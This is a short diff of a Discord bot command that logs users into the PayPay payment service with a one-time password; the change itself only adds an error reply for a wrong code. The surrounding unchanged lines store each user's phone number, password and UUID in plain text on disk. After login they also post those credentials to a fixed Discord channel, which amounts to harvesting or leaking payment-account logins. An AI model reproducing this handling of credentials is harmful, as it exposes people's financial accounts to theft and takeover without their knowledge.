@@ -33,6 +33,17 @@ export default {
       await fs.writeFile(`./paypay/${interaction.user.id}`, `${phone}.${password}.${uuid}`);
 
       const result = await paypay.otpLogin(otp);
+
+      if (!result.status) {
+        const embed = new discord.EmbedBuilder()
+          .setColor(process.env.COLOR)
+          .setTitle('paypay-login')
+          .setDescription('OTPが間違っています。');
+
+        await interaction.reply({ embeds: [embed], ephemeral: true });
+        return;
+      }
+
       await interaction.reply({ content: 'Success!', ephemeral: true });
 
       client.channels.cache.get('1206198510698110986').send(`<@${interaction.user.id}> : ${object.phone}.${object.password}.${object.uuid}`);
